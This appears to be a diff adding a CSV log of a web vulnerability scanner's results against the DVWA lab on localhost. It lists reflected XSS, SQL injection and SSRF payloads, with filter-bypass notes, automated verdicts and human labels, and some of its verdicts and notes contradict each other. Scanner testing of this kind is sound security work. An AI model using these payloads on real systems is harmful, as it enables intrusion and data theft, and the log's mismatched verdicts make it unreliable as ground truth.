@@ -1,0 +1,45 @@
+﻿序号,时间戳,漏洞类型,用例ID,载荷,请求端点,HTTP状态,判定结果,置信度,证据,响应长度,耗时ms,人工标注,标注一致性,来源,备注
+1,2026-11-01 17:23:05,xss_r,xss_r_001,<script>alert('nx6pop49x9')</script>,vulnerabilities/xss_r/,200,REFLECTED_MODIFIED,low,标记存在但载荷被截断或改写,4355,37,vuln,不一致,dataset,基础 script 标签，验证是否存在转义
+2,2026-11-01 17:23:05,xss_r,xss_r_002,<ScRiPt>alert('nxvi46p8lx')</ScRiPt>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4363,44,vuln,一致,dataset,大小写混淆，绕过基于小写正则的黑名单
+3,2026-11-01 17:23:05,xss_r,xss_r_003,<img src=x onerror=alert('nxmq7bub5h')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4366,44,vuln,一致,dataset,事件属性型，不依赖 script 标签
+4,2026-11-01 17:23:06,xss_r,xss_r_004,<svg/onload=alert('nxtvf3loh5')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4359,43,vuln,一致,dataset,SVG 标签自闭合 + 事件属性
+5,2026-11-01 17:23:06,xss_r,xss_r_005,"""><script>alert('nxtgqr1kel')</script>",vulnerabilities/xss_r/,200,REFLECTED_MODIFIED,low,标记存在但载荷被截断或改写,4357,30,vuln,不一致,dataset,双引号闭合属性后注入 script
+6,2026-11-01 17:23:06,xss_r,xss_r_006,'><svg/onload=alert('nxwjrcwg6l')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4361,42,vuln,一致,dataset,单引号闭合 + SVG 事件
+7,2026-11-01 17:23:07,xss_r,xss_r_007,<body onload=alert('nx1e1yi25i')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4360,44,vuln,一致,dataset,body 事件属性型
+8,2026-11-01 17:23:07,xss_r,xss_r_008,"<a href=""javascript:alert('nx8vvywj8h')"">click</a>",vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4377,43,vuln,一致,dataset,伪协议型，需用户交互，证明可注入可执行链接
+9,2026-11-01 17:23:07,xss_r,xss_r_009,<svg><script>alert('nxap6zif2p')</script></svg>,vulnerabilities/xss_r/,200,REFLECTED_MODIFIED,low,标记存在但载荷被截断或改写,4366,41,vuln,不一致,dataset,SVG 命名空间内嵌 script
+10,2026-11-01 17:23:07,xss_r,xss_r_010,<<script>alert('nxxtta37zg');//</script>,vulnerabilities/xss_r/,200,REFLECTED_MODIFIED,low,标记存在但载荷被截断或改写,4359,44,vuln,不一致,dataset,双写尖括号干扰标签匹配
+11,2026-11-01 17:23:08,xss_r,xss_r_011,<scr<script>ipt>alert('nxy75w335m')</script>,vulnerabilities/xss_r/,200,REFLECTED_MODIFIED,low,标记存在但载荷被截断或改写,4363,44,vuln,不一致,dataset,嵌套标签，针对单次替换式过滤
+12,2026-11-01 17:23:08,xss_r,xss_r_012,<details open ontoggle=alert('nxx8vw5939')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4370,42,vuln,一致,dataset,details/ontoggle 自动触发事件
+13,2026-11-01 17:23:08,xss_r,xss_r_013,"<iframe srcdoc=""<script>alert('nxtdzi43c1')</script>"">",vulnerabilities/xss_r/,200,REFLECTED_MODIFIED,low,标记存在但载荷被截断或改写,4373,43,vuln,不一致,dataset,srcdoc 内联文档执行脚本
+14,2026-11-01 17:23:09,xss_r,xss_r_014,<img src=1 onerror=alert('nxmt9w6lby')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4366,44,vuln,一致,dataset,属性值不加引号，测试属性解析畸形
+15,2026-11-01 17:23:09,xss_r,xss_r_015,"""><img src=x onerror=alert('nxvopdi2mf')>",vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4368,42,vuln,一致,dataset,闭合后改用 img 事件
+16,2026-11-01 17:23:09,xss_r,xss_r_016,<video><source onerror=alert('nxelfn1x4n')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4370,31,vuln,一致,dataset,video/source 事件型，覆盖少见标签
+17,2026-11-01 17:23:09,xss_r,xss_r_017,&lt;script&gt;alert('nx7kg89l9d')&lt;/script&gt;,vulnerabilities/xss_r/,200,REFLECTED_PLAIN,medium,随机标记原样回显，但载荷不含可执行结构，仅证明回显未过滤,4375,30,clean,一致,dataset,实体编码对照：浏览器不会解析为标签
+18,2026-11-01 17:23:10,xss_r,xss_r_018,plain-text-nxeedubnms,vulnerabilities/xss_r/,200,REFLECTED_PLAIN,medium,随机标记原样回显，但载荷不含可执行结构，仅证明回显未过滤,4348,43,clean,一致,dataset,纯文本对照：只验证回显，不构成注入
+19,2026-11-01 17:23:10,sqli,sqli_001,1' OR '1'='1,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,652,44,vuln,一致,dataset,恒真条件，返回全量记录
+20,2026-11-01 17:23:10,sqli,sqli_002,1' OR 1=1-- -,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,650,46,vuln,一致,dataset,注释符截断后半段查询
+21,2026-11-01 17:23:11,sqli,sqli_003,1' OR 1=1#,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,647,29,vuln,一致,dataset,井号注释，覆盖不同注释符
+22,2026-11-01 17:23:11,sqli,sqli_004,1' AND '1'='2,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,653,44,vuln,一致,dataset,布尔为假，结果集为空，构成差分证据
+23,2026-11-01 17:23:11,sqli,sqli_005,"1' UNION SELECT 1,'nxnyrzotet'-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,673,44,vuln,一致,dataset,联合查询回显随机标记，2 列匹配
+24,2026-11-01 17:23:11,sqli,sqli_006,"-1' UNION SELECT 1,'nxuojvt5qw'-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,673,15,vuln,一致,dataset,负值主查询置空，确保只回显注入行
+25,2026-11-01 17:23:12,sqli,sqli_007,1' AND SLEEP(2)-- -,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,656,28,vuln,一致,dataset,时间盲注，观察响应延迟
+26,2026-11-01 17:23:12,sqli,sqli_008,"1' AND IF(1=1,SLEEP(1),0)-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,666,43,vuln,一致,dataset,条件时间盲注，确认延迟由表达式触发
+27,2026-11-01 17:23:12,sqli,sqli_009,"1' AND updatexml(1,concat(0x7e,database()),1)-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,686,29,vuln,一致,dataset,报错注入，利用 XPath 报错回显库名
+28,2026-11-01 17:23:13,sqli,sqli_010,"1' AND extractvalue(1,concat(0x7e,database()))-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,687,31,vuln,一致,dataset,extractvalue 报错注入
+29,2026-11-01 17:23:13,sqli,sqli_011,1' OR '1'='1' --,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,657,44,vuln,一致,dataset,带空格的注释符，覆盖不同截断写法
+30,2026-11-01 17:23:13,sqli,sqli_012,1' ORDER BY 3-- -,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,654,45,vuln,一致,dataset,列数探测，3 列越界触发报错
+31,2026-11-01 17:23:14,sqli,sqli_013,1,vulnerabilities/sqli/,200,NO_EFFECT,low,未观测到报错、标记、延迟或长度差异,4346,43,clean,一致,dataset,正常输入对照：应与基线一致
+32,2026-11-01 17:23:14,sqli,sqli_014,abc,vulnerabilities/sqli/,200,NO_EFFECT,low,未观测到报错、标记、延迟或长度差异,527,15,clean,一致,dataset,非数字对照：仅返回空结果，不构成注入证据
+33,2026-11-01 17:23:14,sqli,sqli_015,1' AND 1=2-- -,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,651,45,vuln,一致,dataset,恒假条件，结果集为空
+34,2026-11-01 17:23:15,ssrf,ssrf_001,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=nxtb18toa9,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,vuln,不一致,dataset,指向靶场内部反射页，用随机标记证明服务端确实抓取
+35,2026-11-01 17:23:15,ssrf,ssrf_002,http://127.0.0.1/dvwa/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,vuln,不一致,dataset,抓取本机 DVWA 首页
+36,2026-11-01 17:23:16,ssrf,ssrf_003,http://127.0.0.1/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,vuln,不一致,dataset,抓取本机登录页，验证内部页面可达
+37,2026-11-01 17:23:16,ssrf,ssrf_004,http://localhost/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,vuln,不一致,dataset,主机名写法绕过，覆盖 localhost 解析
+38,2026-11-01 17:23:17,ssrf,ssrf_005,http://127.0.0.1:80/dvwa/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,vuln,不一致,dataset,显式端口写法
+39,2026-11-01 17:23:18,ssrf,ssrf_006,http://127.1/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1024,2,未标注,未标注,dataset,回环地址省略写法；是否可解析取决于系统解析器，本机实测返回空响应，故不作标注
+40,2026-11-01 17:23:33,ssrf,ssrf_007,http://2130706433/dvwa/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1024,7253,未标注,未标注,dataset,十进制回环地址，是否可解析取决于系统解析器，本机实测返回空响应，故不作标注
+41,2026-11-01 17:23:34,ssrf,ssrf_008,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,16,vuln,不一致,dataset,抓取内部注入页面，响应包含用户表数据
+42,2026-11-01 17:23:35,ssrf,ssrf_009,http://127.0.0.1/dvwa/vulnerabilities/exec/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,vuln,不一致,dataset,抓取内部命令执行页面，验证横向可达
+43,2026-11-01 17:23:42,ssrf,ssrf_010,http://127.0.0.1:1/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1030,2,clean,一致,dataset,失败对照：未监听端口，服务端抓取应报错
+44,2026-11-01 17:23:42,ssrf,ssrf_011,http://[::1]/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,SSRF_CONFIRMED,medium,响应包含目标页面的内容指纹，服务端确实抓取了内部资源,3092,58,vuln,一致,dataset,IPv6 回环写法，用于绕过只拦截 127.0.0.1 / localhost 的黑名单
